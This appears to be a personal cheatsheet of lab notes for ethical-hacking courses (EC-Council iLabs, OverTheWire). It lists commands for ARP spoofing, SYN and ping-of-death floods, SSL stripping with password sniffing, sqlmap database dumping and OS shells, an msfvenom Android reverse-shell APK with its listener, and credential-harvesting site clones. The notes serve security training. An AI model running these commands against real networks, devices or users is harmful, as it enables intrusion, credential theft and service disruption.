# Ethical Hacking Cheatsheet

## EC Council iLabs

### Lab 1 - Footprinting and Reconnaissance
#### Tools and Commands
1. Google Dorks (https://www.exploit-db.com/google-hacking-database)
2. Youtube metadata (https://mattw.io/youtube-metadata) - can be used to find geolocation, video metadata, and reverse image search the thumbnail
3. FTP search engines (https://www.searchftps.net/)
4. IoT search engines (https://www.shodan.io)
5. Domain and subdomains (https://www.netcraft.com)
6. People search (https://www.peekyou.com)
7. Gather emails (theHarvester)
8. Sherlock (people search)

### Lab 7 - Sniffing
#### Tools and Commands
1. macof (MAC flooding with random MAC addresses)
   - `macof -i eth0 -n 10` (-i specifies the interface, -n the number of packets. Can be used with `-d <target ip>`)
2. Yersinia (DHCP starvation)
   - `yersinia -I` (-I start an interactive ncurses session, press `h` for help)
   - press F2 to select DHCP Fields.
   - press `x` to list available attack options
   - press 1 to start the attack
   - press `q` to stop the attack and exit Yersinia
3. arpspoof (ARP Poisoning)
   - `arpspoof -i <inteface> -t <acess point or gateway IP> <target IP>` (informs the gateway that the target has our MAC address; they think we are the target system)
   - `arpspoof -i <inteface> -t <target IP> <acess point or gateway IP>` (informs the target system that it is the access point)
4. Cain & Abel (MITM)
   - Tool on Windows machine
   - Click `Configure`, ensure the adapter associated with the IP address of the machine is selected and click Ok
   - Click `Start/Stop Sniffer` icon (next to folder icon)
   - Click on the `Sniffer` tab
   - Right-click and select `Scan MAC Addresses`; select `All hosts in my subnet` and `All Tests`
   - Click the `APR` tab and then click the `+` icon
   - Select one IP from the left pane and one from the right (monitor traffic between those 2)
   - Select the created target IP and click `Start/Stop APR` to poison the target (icon next to `Start/Stop Sniffer` icon)
   - Click the `Passwords` tab to check captured data
5. TMAC (MAC address spoofing)
   - Windows tool
   - GUI tool to change MAC addresses
6. SMAC
   - Windows tool
   - GUI tool to change MAC addresses
7. OmniPeek (didn't use it because it was a free trial, probably not important)
8. Habu (open source pentesting toolkit)
   - `habu.arp.poison <target IP> <attacker IP>` (poison communication between target and attacker)

### Lab 8 - Social Engineering
#### Tools and Commands
1. Social Engineering Toolkit: `./setoolkit` to use
2. Netcraft (browser extension)
3. Phishthank (www.phishtank.com)

### Lab 9 - Denial of Service
#### Tools and Commands
1. Metasploit
   - `search <keyword>` find exploits
   - `use <exploit path>` use exploit
   - `show options` show exploit options
   - `exploit` run the exploit
2. hping3
   - DoS: `hping3 -S <target IP> -a <spoof IP for attacker> -p <port> --flood` (-S sets the SYN flag)
   - Ping of Death: `hping3 -d <packet size> -S -p 21 --flood <target IP>` (packet size used in lab: 65538)
   - UDP flood in NetBIOS: `hping3 -2 -p 139 <target IP>` (-2 specifies UDP mode)
3. Raven Storm
   - Start: `sudo rst`
4. HOIC
5. LOIC

### Lab 10 - Session Hijacking
#### Tools and Commands
1. ZAP (Zed's Attack Proxy)
   - Configure proxy: open `options` (settings icon) > `local proxies`
   - Set break on all requests (click green dot, it turns red)
2. bettercap
   - `bettercap -iface <inteface>`
   - `net.probe on` (sends different types of probe packets in the current subnet for net.recon to detect them)
   - `net.recon on` (sniffs network packets)
   - `set http.proxy.sslstrip true` (enables SSL stripping)
   - `set arp.spoof.targets <target ip>` (spoofs the address of the target host)
   - `http.proxy on` (initiates http proxy)
   - `arp.spoof on` (initiates arp spoofing)
   - `net.sniff on` (performs sniffing on the network)
   - `set net.sniff.regexp '<regex>'` (used on this lab: `.*password=.+`)
3. Hetty
   - Double-click launcher on windows and open `http://localhost:8080` on browser
   - Click `Manage Projects`
   - Click `Proxy Logs` icon
   - Configure browser to use proxy
4. Wireshark

### Lab 11 - Evading IDS, Firewalls, and Honeypots
#### Tools and Commands
1. Snort

### Lab 12 - Hacking Web Servers
#### Tools and Commands
1. Ghost Eye (python tool)
2. Skipfish (security reconnaissance)
3. Httprecon (LAB CRASHED, TODO)

### Lab 14 - SQL Injection
#### Tools and Commands
1. sqlmap
  - `sqlmap -u <url> --cookie="<cookie>" --dbs` (-u specifies the url, cookie specifies the HTTP cookie header value, and --dbs enumerates DBMS databases)
  - `sqlmap -u <url> --cookie="<cookie>" -D <database name> --tables` (-D specifies the DBMS database to enumerate, --tables enumerates the DBMS tables)
  - `sqlmap -u <url> --cookie="<cookie>" -D <database name> -T <table name> --dump` (-T specifies the table to enumerate)
  - `sqlmap -u <url> --cookie="<cookie>" --os-shell` (launches an interactive shell)
2. ZAP (scan for web vulnerabilities)

### Lab 16 - Hacking Mobile Platforms
#### Tools and Commands
1. msfvenom
   - `service postgresql start`
   - `msfvenom -p android/meterpreter/reverse_tcp --platform android -a dalvik LHOST=<attacker IP> R > <path/to/filename.apk>` (create an apk)
   - create a directory to share the apk
     - `mkdir /var/www/html/share`
     - `chmod -R 755 /var/www/html/share`
     - `chown -R www-data:www-data /var/www/html/share`
   - `service apache2 start`
   - `cp <path to apk> <created directory>`
   - `msfconsole`
     - `use exploit/multi/handler`
     - `set payload android/meterpreter/reverse_tcp`
     - `set LHOST <attacker IP>`
     - `show options` (to check the listening port)
     - `exploit -j -z`
     - `sessions -i <id>` (open session with id)
2. Social Engineering Toolkit
   - `./setoolkit`
   - `1`
   - `2`
   - `3` (credential harvester)
   - `2` (site cloner)
   - `<attacker IP>`
   - `<site to clone>`


## OverTheWire

### Lab 1 - Bandit
#### Tools and Commands
- Find unique words in a file: `grep -wo "[[:alnum:]]\+" <input_file> | sort | uniq -u`
- Find repeated words in a file: `grep -wo "[[:alnum:]]\+" input_file.txt | sort | uniq -d`
- Print all words and word counts on a file: `grep -wo "[[:alnum:]]\+" input_file.txt | sort | uniq -c`
- Decode Base64: `base64 -d <filename>`
- Decode substituion cipher (ROT13): `cat <filename> | tr "$(echo -n {A..Z} {a..z} | tr -d ' ')" "$(echo -n {N..Z} {A..M} {n..z} {a..m} | tr -d ' ')"`
- Hexdump to file: `xxd -r filename > outputfile`
- Open connection to server: `nc <ip> <port>`
- Create a listening port: `nc -l <port>`
- Enumerate from x to y on bash script: `for i in {x..y}; do`
- Access bash from more and vim: Make a really small window and when the more command appears type "vi". To create a shell use `:set shell=/bin/bash` and `:shell`
- Read git repository tag: `git show <tag>`

## Try Hack Me

## Hack The Box

## Other Tools and Resources
- GTFOBins: https://gtfobins.github.io/
- Hacking book: https://book.hacktricks.xyz/welcome/readme
- Pentest Monkey Cheat Sheet: https://pentestmonkey.net/
- Discover hosts in same network as Attacker Machine: `netdiscover -r <ip subnet>` or `nmap <ip subnet>`
- Nmap scan all ports: `nmap -A -p- <ip addr>`
- Search exploits from exploitdb: `searchsploit <keyword>` (only for kali?)
- Spawning a shell through Python: `python -c 'import pty; pty.spawn("/bin/bash")'`
